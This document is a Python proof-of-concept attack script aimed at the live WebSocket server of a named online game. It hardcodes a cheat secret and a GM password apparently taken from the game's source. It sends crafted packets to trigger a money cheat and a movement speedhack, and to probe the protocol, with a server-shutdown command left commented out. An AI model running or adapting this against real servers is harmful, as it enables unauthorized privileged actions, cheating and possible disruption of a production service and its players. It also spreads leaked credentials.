#!/usr/bin/env python3
"""
PoC #6: Live WebSocket Protocol Test against play.minhchauh5.com

Connects to wss://play.minhchauh5.com/ws and attempts to:
  1. Establish WebSocket connection
  2. Capture initial handshake / protocol messages
  3. Send crafted movement packets (PoC #4)
  4. Send chat messages with cheat commands (PoC #3)
  5. Analyze protocol structure from captured data

This is a LIVE test against the production server.
"""

import websocket
import json
import struct
import time
import ssl
import argparse
import threading

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
WS_URL = "wss://play.minhchauh5.com/ws"
ORIGIN = "https://play.minhchauh5.com"

# Known secrets from source code
CHEAT_SECRET = "timeismoney@@!!"
GM_PASSWORD = "123456789"

# ---------------------------------------------------------------------------
# Packet helpers (protocol structure guessed from Java source)
# ---------------------------------------------------------------------------

def build_chat_packet(message, serial=1):
    """
    Build a chat packet.
    Real format depends on the game protocol OpCode values.
    This is a best-guess based on typical binary game protocols.
    """
    # Try multiple common formats
    payload = message.encode("utf-8")
    
    # Format 1: [opcode:2][serial:4][length:2][string]
    packet = struct.pack(">H", 0x0064)  # guessed chat opcode
    packet += struct.pack(">I", serial)
    packet += struct.pack(">H", len(payload))
    packet += payload
    return packet

def build_move_packet(x, y, timestamp=None, serial=1):
    """
    Build a movement packet.
    PlayerPacketHandler.java:16070 reads x, y, time from client.
    """
    if timestamp is None:
        timestamp = int(time.time() * 1000)
    
    # Format guess: [opcode:2][serial:4][x:2][y:2][time:8]
    packet = struct.pack(">H", 0x0001)  # guessed move opcode
    packet += struct.pack(">I", serial)
    packet += struct.pack(">H", x & 0xFFFF)
    packet += struct.pack(">H", y & 0xFFFF)
    packet += struct.pack(">Q", timestamp)
    return packet

def build_login_packet(username="test_bot", password="", serial=1):
    """Build a login packet."""
    u = username.encode("utf-8")
    p = password.encode("utf-8")
    payload = struct.pack(">H", len(u)) + u + struct.pack(">H", len(p)) + p
    packet = struct.pack(">H", 0x0002)  # guessed login opcode
    packet += struct.pack(">I", serial)
    packet += struct.pack(">H", len(payload))
    packet += payload
    return packet

# ---------------------------------------------------------------------------
# WebSocket callbacks
# ---------------------------------------------------------------------------
captured_messages = []
capture_lock = threading.Lock()

def on_message(ws, message):
    with capture_lock:
        captured_messages.append(("recv", time.time(), message))
    
    # Try to parse as text
    if isinstance(message, bytes):
        hex_preview = message[:64].hex() if len(message) > 0 else "(empty)"
        print(f"  [RECV] {len(message)} bytes: {hex_preview}...")
    else:
        print(f"  [RECV] text: {message[:200]}")

def on_error(ws, error):
    print(f"  [ERROR] {error}")

def on_close(ws, close_status_code, close_msg):
    print(f"  [CLOSE] code={close_status_code}, msg={close_msg}")

def on_open(ws):
    print(f"  [OPEN] Connected to {WS_URL}")
    print(f"  [INFO] Connection established successfully!")

# ---------------------------------------------------------------------------
# Test functions
# ---------------------------------------------------------------------------

def test_connection():
    """Test basic WebSocket connectivity."""
    print("\n" + "=" * 60)
    print("TEST 1: WebSocket Connection")
    print("=" * 60)
    print(f"Connecting to {WS_URL}...")
    
    ws = websocket.WebSocketApp(
        WS_URL,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    
    # Run in thread
    wst = threading.Thread(target=lambda: ws.run_forever(
        sslopt={"cert_reqs": ssl.CERT_NONE},
        origin=ORIGIN,
    ))
    wst.daemon = True
    wst.start()
    
    # Wait for connection
    time.sleep(3)
    
    if ws.sock and ws.sock.connected:
        print("  [OK] WebSocket connected!")
        
        # Wait for initial server messages
        print("  [*] Waiting for server handshake messages...")
        time.sleep(5)
        
        with capture_lock:
            if captured_messages:
                print(f"  [INFO] Received {len(captured_messages)} messages during handshake")
                for i, (direction, ts, msg) in enumerate(captured_messages):
                    if isinstance(msg, bytes):
                        print(f"  [{i}] {len(msg)} bytes: {msg[:100].hex()}")
                    else:
                        print(f"  [{i}] text: {str(msg)[:200]}")
            else:
                print("  [INFO] No messages received yet (may need login first)")
        
        ws.close()
        return True
    else:
        print("  [FAIL] WebSocket connection failed")
        return False

def test_chat_cheat():
    """Test sending cheat secret via chat."""
    print("\n" + "=" * 60)
    print("TEST 2: Chat / Cheat Command Test")
    print("=" * 60)
    print(f"Sending cheat secret: '{CHEAT_SECRET}'")
    print("NOTE: This requires a logged-in session and testserver=true on backend")
    
    ws = websocket.WebSocketApp(
        WS_URL,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    
    wst = threading.Thread(target=lambda: ws.run_forever(
        sslopt={"cert_reqs": ssl.CERT_NONE},
        origin=ORIGIN,
    ))
    wst.daemon = True
    wst.start()
    time.sleep(3)
    
    if ws.sock and ws.sock.connected:
        # Send cheat secret
        chat_pkt = build_chat_packet(CHEAT_SECRET)
        print(f"  [SEND] Chat packet: {chat_pkt.hex()}")
        ws.send(chat_pkt, opcode=websocket.ABNF.OPCODE_BINARY)
        
        # Send /money command
        time.sleep(1)
        money_pkt = build_chat_packet("/money 999999")
        print(f"  [SEND] /money packet: {money_pkt.hex()}")
        ws.send(money_pkt, opcode=websocket.ABNF.OPCODE_BINARY)
        
        # Send /shut command (DANGEROUS - only if you want to test!)
        # time.sleep(1)
        # shut_pkt = build_chat_packet("/shut")
        # ws.send(shut_pkt, opcode=websocket.ABNF.OPCODE_BINARY)
        
        time.sleep(3)
        
        with capture_lock:
            print(f"  [INFO] Received {len(captured_messages)} responses")
            for i, (direction, ts, msg) in enumerate(captured_messages):
                if isinstance(msg, bytes):
                    print(f"  [{i}] {len(msg)} bytes: {msg[:100].hex()}")
                else:
                    print(f"  [{i}] text: {str(msg)[:200]}")
        
        ws.close()
    else:
        print("  [FAIL] Could not connect")

def test_movement_hack():
    """Test sending crafted movement packets."""
    print("\n" + "=" * 60)
    print("TEST 3: Movement Hack (Wallhack / Speedhack)")
    print("=" * 60)
    print("Sending micro-step movement packets to test collision bypass")
    
    ws = websocket.WebSocketApp(
        WS_URL,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    
    wst = threading.Thread(target=lambda: ws.run_forever(
        sslopt={"cert_reqs": ssl.CERT_NONE},
        origin=ORIGIN,
    ))
    wst.daemon = True
    wst.start()
    time.sleep(3)
    
    if ws.sock and ws.sock.connected:
        # Send rapid micro-steps (speedhack simulation)
        start_x, start_y = 100, 100
        print(f"  [*] Starting position: ({start_x}, {start_y})")
        print(f"  [*] Sending 20 micro-steps (1 unit each)...")
        
        for i in range(20):
            x = start_x + i + 1
            y = start_y
            move_pkt = build_move_packet(x, y, serial=i+1)
            ws.send(move_pkt, opcode=websocket.ABNF.OPCODE_BINARY)
            time.sleep(0.05)  # 50ms between steps = 20 units/sec
        
        print(f"  [*] Final position: ({start_x + 20}, {start_y})")
        print(f"  [*] Total movement: 20 units in ~1 second")
        print(f"  [*] If server accepts, wallhack/speedhack is CONFIRMED")
        
        time.sleep(2)
        
        with capture_lock:
            print(f"  [INFO] Received {len(captured_messages)} responses")
            for i, (direction, ts, msg) in enumerate(captured_messages):
                if isinstance(msg, bytes):
                    print(f"  [{i}] {len(msg)} bytes: {msg[:100].hex()}")
                else:
                    print(f"  [{i}] text: {str(msg)[:200]}")
        
        ws.close()

def test_protocol_discovery():
    """Try to discover protocol by sending various packet types."""
    print("\n" + "=" * 60)
    print("TEST 4: Protocol Discovery")
    print("=" * 60)
    
    ws = websocket.WebSocketApp(
        WS_URL,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close,
    )
    
    wst = threading.Thread(target=lambda: ws.run_forever(
        sslopt={"cert_reqs": ssl.CERT_NONE},
        origin=ORIGIN,
    ))
    wst.daemon = True
    wst.start()
    time.sleep(3)
    
    if ws.sock and ws.sock.connected:
        # Try sending raw bytes with different opcodes to see responses
        test_packets = [
            ("Empty", b""),
            ("Login attempt", build_login_packet("testuser123", "")),
            ("Chat hello", build_chat_packet("hello")),
            ("Move 0,0", build_move_packet(0, 0)),
            ("Move 9999,9999", build_move_packet(9999, 9999)),
        ]
        
        for name, pkt in test_packets:
            print(f"  [SEND] {name}: {pkt[:32].hex()}")
            ws.send(pkt, opcode=websocket.ABNF.OPCODE_BINARY)
            time.sleep(1)
        
        time.sleep(3)
        
        with capture_lock:
            print(f"\n  [INFO] Total responses: {len(captured_messages)}")
            for i, (direction, ts, msg) in enumerate(captured_messages):
                if isinstance(msg, bytes):
                    print(f"  [{i}] {len(msg)} bytes: {msg[:200].hex()}")
                else:
                    print(f"  [{i}] text: {str(msg)[:300]}")
        
        ws.close()

def main():
    parser = argparse.ArgumentParser(
        description="Live WebSocket Protocol Test against play.minhchauh5.com",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Tests:
  1. Connection test — verify WebSocket is reachable
  2. Chat/cheat test — send cheat secret and commands
  3. Movement hack — send micro-step packets
  4. Protocol discovery — probe with various packet types

Examples:
  python 06_websocket_live_test.py --all
  python 06_websocket_live_test.py --connect
  python 06_websocket_live_test.py --chat
  python 06_websocket_live_test.py --move
  python 06_websocket_live_test.py --discover
        """
    )
    parser.add_argument("--all", action="store_true", help="Run all tests")
    parser.add_argument("--connect", action="store_true", help="Test connection only")
    parser.add_argument("--chat", action="store_true", help="Test chat/cheat commands")
    parser.add_argument("--move", action="store_true", help="Test movement hack")
    parser.add_argument("--discover", action="store_true", help="Protocol discovery")
    args = parser.parse_args()
    
    # Default to --all if no args
    if not any([args.all, args.connect, args.chat, args.move, args.discover]):
        args.all = True
    
    print("=" * 60)
    print("PoC #6: Live WebSocket Protocol Test")
    print(f"Target: {WS_URL}")
    print(f"Origin: {ORIGIN}")
    print("=" * 60)
    print()
    print("WARNING: This connects to the LIVE production server.")
    print("All packets sent are for security testing purposes only.")
    print()
    
    if args.all or args.connect:
        test_connection()
    
    if args.all or args.chat:
        test_chat_cheat()
    
    if args.all or args.move:
        test_movement_hack()
    
    if args.all or args.discover:
        test_protocol_discovery()
    
    print("\n" + "=" * 60)
    print("All tests completed.")
    print("=" * 60)

if __name__ == "__main__":
    main()